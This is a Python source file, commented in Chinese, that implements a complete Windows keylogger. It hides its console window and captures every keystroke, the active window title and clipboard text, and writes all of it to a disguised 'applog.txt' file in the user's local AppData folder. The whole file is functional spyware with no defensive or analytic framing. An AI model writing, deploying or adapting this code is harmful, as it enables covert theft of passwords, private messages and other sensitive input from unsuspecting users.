import ctypes    #提供C兼容的数据类型
import logging    #用于记录键盘记录
import os

kernel32  = ctypes.windll.kernel32    #调用kernel32.dll
user32 = ctypes.windll.user32    #调用user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(),0)    #隐藏窗口

def get_current_window():    #抓取当前窗口标题
    #必需的WinAPI函数
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()    #获取当前窗口句柄
    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递
    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本

    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中

    return buff.value    #返回buff的值

def get_clipboard():

    CF_TEXT = 1    #设置剪贴板格式

    #GlobalLock/GlobalUnlock 参数与返回类型
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    #GetClipboardData的返回类型
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    #所需剪贴板函数
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用
            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄
            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针
            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针
            value = text.value    #存储有用的值
            kernel32.GlobalUnlock(data_locked)    #递减锁计数
            return value.decode('gb18030')    #返回剪贴板的值
    finally:
        CloseClipboard()    #关闭剪贴板

def get_keystrokes(log_dir,log_name):    #监听与记录敲击键盘内容
    #记录
    logging.basicConfig(filename=(log_dir + '\\' + log_name),level=logging.DEBUG,format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState    #WinAPI函数，确定按键是向上还是向下
    special_keys = {
        0x08: 'BS',
        0x09: 'Tap',
        0x10: 'Shift',
        0x11: 'Ctrl',
        0x12: 'Alt',
        0x14: 'CapsLock',
        0x1b: 'Esc',
        0x20: 'Space',
        0x2e: 'Del',
    }
    current_window = None
    line = []    #存储点击的字符

    while True:
        if current_window != get_current_window():    #判断current_window内容不是当前打开的窗口
            current_window = get_current_window()    #将窗口标题放在current_window中
            logging.info(str(current_window))    #将当前窗口标题写入日志文件

        for i in range(1,256):    #256个ASCII字符
            if GetAsyncKeyState(i) & 1:    #如果点击某个键并匹配ASCII字符
                if i in special_keys:    #如果是特殊键，这样记录
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d:    #如果键入<ENTER>，则记录然后清除行变量
                    logging.info(line)
                    line.clear()
                elif i ==0x63 or i == 0x43 or i == 0x56 or i ==0x76:    #如果点击字符'c'或'v'，则获取剪贴板数据
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a:    #如果是字母数字字符，则追加到line
                    line.append(chr(i))

def main():
    log_dir = os.environ['localappdata']
    log_name = 'applog.txt'

    get_keystrokes(log_dir, log_name)

if __name__ == '__main__':
    main()